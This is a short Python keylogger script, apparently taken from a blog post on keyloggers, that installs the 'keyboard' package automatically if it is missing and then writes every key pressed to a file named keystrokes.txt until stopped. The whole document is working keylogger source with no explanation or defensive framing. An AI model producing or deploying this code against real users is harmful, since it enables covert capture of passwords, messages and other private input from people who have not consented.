# https://mohamedaezzat.github.io/posts/keylogger/

import os

try:
    import keyboard
except:
    os.system("pip install keyboard")
    import keyboard

log_file = 'keystrokes.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait()